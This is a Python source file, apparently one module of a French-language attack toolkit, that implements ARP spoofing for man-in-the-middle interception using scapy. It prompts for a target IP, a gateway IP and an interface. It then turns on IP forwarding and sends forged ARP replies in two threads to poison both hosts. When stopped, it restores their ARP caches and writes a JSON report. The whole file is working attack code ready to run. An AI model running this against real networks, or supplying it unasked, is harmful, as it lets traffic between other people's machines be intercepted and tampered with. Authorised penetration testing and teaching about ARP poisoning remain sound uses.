# -*- coding: utf-8 -*-
# Module 2 : ARP spoofing + MITM stats
import time, os, json
from datetime import datetime

try:
    from scapy.all import ARP, Ether, srp, send, get_if_hwaddr, conf
except ImportError:
    ARP = None

class ARPSpoofer:
    def __init__(self, target, gateway, iface):
        self.target = target
        self.gateway = gateway
        self.iface = iface
        self.running = False
        self.packets_sent = 0
        self.start_time = None

    def get_mac(self, ip):
        if ARP is None: return None
        res = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                  timeout=2, verbose=0, iface=self.iface)[0]
        return res[0][1].hwsrc if res else None

    def enable_forward(self):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")

    def disable_forward(self):
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")

    def spoof_loop(self, target_ip, target_mac, spoof_ip):
        while self.running:
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip),
                 iface=self.iface, verbose=0)
            self.packets_sent += 1
            time.sleep(1.5)

    def spoof(self):
        tm = self.get_mac(self.target)
        gm = self.get_mac(self.gateway)
        if not tm or not gm:
            print("[!] MAC introuvable"); return
        self.enable_forward()
        self.start_time = datetime.now()
        self.running = True
        import threading
        t1 = threading.Thread(target=self.spoof_loop,
                              args=(self.target, tm, self.gateway), daemon=True)
        t2 = threading.Thread(target=self.spoof_loop,
                              args=(self.gateway, gm, self.target), daemon=True)
        t1.start(); t2.start()
        while self.running:
            time.sleep(1)

    def restore(self):
        self.running = False
        self.disable_forward()
        tm = self.get_mac(self.target)
        gm = self.get_mac(self.gateway)
        if tm and gm:
            for _ in range(5):
                send(ARP(op=2, pdst=self.target, hwdst=tm,
                         psrc=self.gateway, hwsrc=gm), iface=self.iface, verbose=0)
                send(ARP(op=2, pdst=self.gateway, hwdst=gm,
                         psrc=self.target, hwsrc=tm), iface=self.iface, verbose=0)
                time.sleep(1)
        os.makedirs("output", exist_ok=True)
        with open("output/arp_report.json","w",encoding="utf-8") as f:
            json.dump({"target":self.target,"gateway":self.gateway,
                       "packets_sent":self.packets_sent,
                       "duration":str(datetime.now()-self.start_time) if self.start_time else "0",
                       "timestamp":datetime.now().isoformat()}, f, indent=2)

def run_interactive():
    from toolkit import ok, err, info, warn, section, ask, confirm, C
    section("ARP SPOOFING / MITM")
    if os.name != "posix":
        warn("Sous Windows, ip_forward n'est pas activé automatiquement.")
    target = ask("IP cible")
    gateway = ask("IP passerelle")
    iface = ask("Interface", "eth0")
    if not confirm(f"Empoisonner ARP entre {target} et {gateway} ?"): return
    sp = ARPSpoofer(target, gateway, iface)
    info("Empoisonnement en cours — Ctrl+C pour arrêter et restaurer")
    try:
        sp.spoof()
    except KeyboardInterrupt:
        pass
    finally:
        sp.restore()
        ok(f"Restauré. {sp.packets_sent} paquets envoyés.")
        ok("Rapport : output/arp_report.json")